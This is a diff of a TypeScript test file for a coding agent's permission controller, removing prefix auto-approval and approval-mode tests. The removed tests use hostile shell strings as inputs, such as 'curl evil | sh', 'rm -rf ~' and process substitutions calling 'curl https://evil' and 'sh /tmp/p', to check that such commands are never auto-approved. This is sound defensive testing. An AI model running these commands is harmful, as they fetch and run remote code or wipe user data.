@@ -8,20 +8,11 @@ import {
 import { RpcForkHost, type RpcForkContext } from "@oh-my-pi/pi-coding-agent/modes/rpc/rpc-fork-host";
 import type { AgentTool } from "@oh-my-pi/pi-agent-core";
 import { Settings } from "@oh-my-pi/pi-coding-agent/config/settings";
-import {
-	cfgToolsApproval,
-	cfgToolsApprovalMode,
-	cfgToolsApprovalPrefixes,
-} from "@oh-my-pi/pi-coding-agent/tools/settings";
+import { cfgToolsApproval, cfgToolsApprovalMode } from "@oh-my-pi/pi-coding-agent/tools/settings";
 import type { AgentSession } from "@oh-my-pi/pi-coding-agent/session/agent-session";
-import type { RpcForkCommandBase } from "@oh-my-pi/pi-coding-agent/modes/rpc/rpc-fork-types";
-import type { RpcResponse } from "@oh-my-pi/pi-coding-agent/modes/rpc/rpc-types";
 
 const makeContext = (emitted: object[]): RpcForkContext => ({
 	emit: frame => emitted.push(frame),
-	success: (id, command, data) => ({ id, type: "response", command, success: true, data }) as RpcResponse,
-	error: (id, command, message, code) =>
-		({ id, type: "response", command, success: false, error: message, ...(code ? { code } : {}) }) as RpcResponse,
 });
 
 // Tier-only declaration, mirroring the real bash tool: no explicit per-tool
@@ -47,7 +38,6 @@ const captured: Array<{ requestPermission: (toolCall: unknown, o: unknown, s?: A
 function setupWithBridge(options?: {
 	mode?: "always-ask" | "write" | "yolo";
 	policies?: Record<string, string>;
-	projectMode?: boolean;
 }): Harness {
 	const emitted: object[] = [];
 	const host = new RpcForkHost(makeContext(emitted));
@@ -62,7 +52,7 @@ function setupWithBridge(options?: {
 		agent: { state: { tools: [promptTool] } },
 		setClientBridge: (bridge: (typeof captured)[number]) => captured.push(bridge),
 	} as unknown as AgentSession;
-	new RpcForkPermissionController(host, session, { projectMode: options?.projectMode });
+	new RpcForkPermissionController(host, session);
 	host.activate();
 	expect(captured).toHaveLength(1);
 	return {
@@ -80,10 +70,10 @@ function setupWithBridge(options?: {
 
 describe("RpcForkPermissionController (4.1)", () => {
 	test("subagent bridges keep their owner across other sessions' activation and disposal", async () => {
-		const a = setupWithBridge({ mode: "always-ask", projectMode: true });
+		const a = setupWithBridge({ mode: "always-ask" });
+		const b = setupWithBridge({ mode: "yolo" });
 		const delegate = getRpcSubagentPermissionDelegate(a.settings)!;
 		const bridge = createRpcSubagentPermissionBridge({ subagentId: "a-child", agentType: "worker" }, delegate);
-		const b = setupWithBridge({ mode: "yolo", projectMode: true });
 		const call = {
 			toolCallId: "child-call",
 			toolName: "bash",
@@ -103,14 +93,6 @@ describe("RpcForkPermissionController (4.1)", () => {
 		await expect(bridge.requestPermission!(call, [], undefined)).rejects.toThrow(/disconnected/);
 	});
 
-	test("project approval changes only the runtime layer", async () => {
-		const h = setupWithBridge({ mode: "write", projectMode: true });
-		await h.host.handleCommand({ type: "set_approval_mode", mode: "always-ask" } as RpcForkCommandBase);
-		expect(cfgToolsApprovalMode.get(h.settings)).toBe("always-ask");
-		cfgToolsApprovalMode.clearOverride(h.settings);
-		expect(cfgToolsApprovalMode.get(h.settings)).toBe("write");
-		h.host.dispose("test cleanup");
-	});
 	test("prompt policy emits a structured permission_request; allow_once resolves", async () => {
 		const h = setupWithBridge({ mode: "always-ask" });
 		const pending = h.requestPermission({ command: "ls -la" });
@@ -286,88 +268,23 @@ describe("RpcForkPermissionController (4.1)", () => {
 		h.host.dispose("test cleanup");
 	});
 
-	test("bash requests carry prefixSuggestion; allow_always_prefix persists only the prefix rule", async () => {
+	test("removed prefix auto-approval response is rejected without granting access", async () => {
 		const h = setupWithBridge({ mode: "always-ask" });
 		const first = h.requestPermission({ command: "npm test" });
 		await Bun.sleep(0);
 		const frame = h.emitted[0] as Record<string, unknown>;
-		expect(frame.prefixSuggestion).toBe("npm ");
-
-		h.settleLast({ type: "permission_response", id: frame.id, option: "allow_always_prefix" });
-		await expect(first).resolves.toMatchObject({ outcome: "selected", optionId: "allow_once" });
-		const prefixes = cfgToolsApprovalPrefixes.get(h.settings) as Record<string, unknown>;
-		expect(prefixes.bash).toEqual(["npm "]);
-		// The whole-tool policy stays untouched: only the prefix is allowed.
+		expect(frame.prefixSuggestion).toBeUndefined();
+		expect(h.settleLast({ type: "permission_response", id: frame.id, option: "allow_always_prefix" })).toBe(true);
+		await expect(first).rejects.toThrow("unknown option");
 		expect(cfgToolsApproval.get(h.settings)).toEqual({});
 
-		// Non-matching command still prompts.
 		h.emitted.length = 0;
-		const third = h.requestPermission({ command: "curl evil" });
+		const second = h.requestPermission({ command: "npm install" });
 		await Bun.sleep(0);
 		expect(h.emitted).toHaveLength(1);
-		const frame3 = h.emitted[0] as Record<string, unknown>;
-		h.settleLast({ type: "permission_response", id: frame3.id, option: "allow_once" });
-		await expect(third).resolves.toMatchObject({ outcome: "selected" });
-	});
-
-	test("second same-prefix command skips the frame entirely", async () => {
-		const h = setupWithBridge({ mode: "always-ask" });
-		const first = h.requestPermission({ command: "git status" });
-		await Bun.sleep(0);
-		const frame = h.emitted[0] as Record<string, unknown>;
-		h.settleLast({ type: "permission_response", id: frame.id, option: "allow_always_prefix" });
-		await expect(first).resolves.toMatchObject({ outcome: "selected", optionId: "allow_once" });
-		const prefixes = cfgToolsApprovalPrefixes.get(h.settings) as Record<string, unknown>;
-		expect(prefixes.bash).toEqual(["git "]);
-
-		// The persisted "git " rule short-circuits `git push` before any frame:
-		// no second permission_request, direct allow_once, rule list unchanged
-		// (a duplicate allow_always_prefix response can never arrive for a
-		// call that never emitted a frame).
-		h.emitted.length = 0;
-		await expect(h.requestPermission({ command: "git push" })).resolves.toMatchObject({
-			outcome: "selected",
-			optionId: "allow_once",
-		});
-		await Bun.sleep(0);
-		expect(h.emitted).toHaveLength(0);
-		expect(cfgToolsApprovalPrefixes.get(h.settings)).toEqual({ bash: ["git "] });
-	});
-
-	test("prefix rules never auto-approve shell composite commands", async () => {
-		const h = setupWithBridge({ mode: "always-ask" });
-		cfgToolsApprovalPrefixes.setEntry(h.settings, "bash", ["npm ", "git "]);
-
-		for (const command of ["npm install && curl evil | sh", "git status; rm -rf ~"]) {
-			h.emitted.length = 0;
-			const pending = h.requestPermission({ command });
-			await Bun.sleep(0);
-			// A user prefix approval covers a single command only; compositions
-			// always fall back to the approval frame.
-			expect(h.emitted).toHaveLength(1);
-			const frame = h.emitted[0] as Record<string, unknown>;
-			expect(frame.type).toBe("permission_request");
-			h.settleLast({ type: "permission_response", id: frame.id, option: "allow_once" });
-			await expect(pending).resolves.toMatchObject({ outcome: "selected", optionId: "allow_once" });
-		}
-	});
-
-	test("prefix rules never auto-approve bash process substitution", async () => {
-		const h = setupWithBridge({ mode: "always-ask" });
-		cfgToolsApprovalPrefixes.setEntry(h.settings, "bash", ["npm "]);
-
-		// `>(cmd)` / `<(cmd)` runs an arbitrary inner command with none of the
-		// classic separators, so each must fall back to the approval frame.
-		for (const command of ["npm run build > >(curl https://evil)", "npm ls <(sh /tmp/p)"]) {
-			h.emitted.length = 0;
-			const pending = h.requestPermission({ command });
-			await Bun.sleep(0);
-			expect(h.emitted).toHaveLength(1);
-			const frame = h.emitted[0] as Record<string, unknown>;
-			expect(frame.type).toBe("permission_request");
-			h.settleLast({ type: "permission_response", id: frame.id, option: "allow_once" });
-			await expect(pending).resolves.toMatchObject({ outcome: "selected", optionId: "allow_once" });
-		}
+		const nextFrame = h.emitted[0] as Record<string, unknown>;
+		h.settleLast({ type: "permission_response", id: nextFrame.id, option: "allow_once" });
+		await expect(second).resolves.toMatchObject({ outcome: "selected", optionId: "allow_once" });
 	});
 
 	test("scopeSubagentApprovalForDelegation sets session-local prompt policies only under RPC v3", () => {
@@ -404,28 +321,7 @@ describe("RpcForkPermissionController (4.1)", () => {
 		h.host.dispose("test cleanup");
 	});
 
-	test("set_approval_mode validates and persists; get_state helper reads the live mode", async () => {
-		const h = setupWithBridge();
-		const bad = await h.host.handleCommand({
-			id: "m0",
-			type: "set_approval_mode",
-			mode: "chaos",
-		} as RpcForkCommandBase);
-		expect(bad).toMatchObject({ success: false });
-
-		const good = await h.host.handleCommand({
-			id: "m1",
-			type: "set_approval_mode",
-			mode: "write",
-		} as RpcForkCommandBase);
-		expect(good).toMatchObject({ command: "set_approval_mode", success: true, data: { approvalMode: "write" } });
-		expect(cfgToolsApprovalMode.get(h.settings)).toBe("write");
-		// The bridge is re-injected after the mode change so the gateway
-		// re-wraps active tools for the new mode without a restart.
-		expect(captured).toHaveLength(2);
-	});
-
-	test("commands and frames are gated on v3 negotiation", async () => {
+	test("interaction frames are gated on v3 negotiation", () => {
 		const emitted: object[] = [];
 		const host = new RpcForkHost(makeContext(emitted));
 		const settings = Settings.isolated();
@@ -436,9 +332,6 @@ describe("RpcForkPermissionController (4.1)", () => {
 		} as unknown as AgentSession;
 		new RpcForkPermissionController(host, session);
 
-		await expect(
-			host.handleCommand({ id: "g1", type: "set_approval_mode", mode: "write" } as RpcForkCommandBase),
-		).resolves.toBeUndefined();
 		expect(host.handleControlFrame({ type: "permission_response", id: "x", option: "allow_once" })).toBe(false);
 		expect(emitted).toHaveLength(0);
 	});
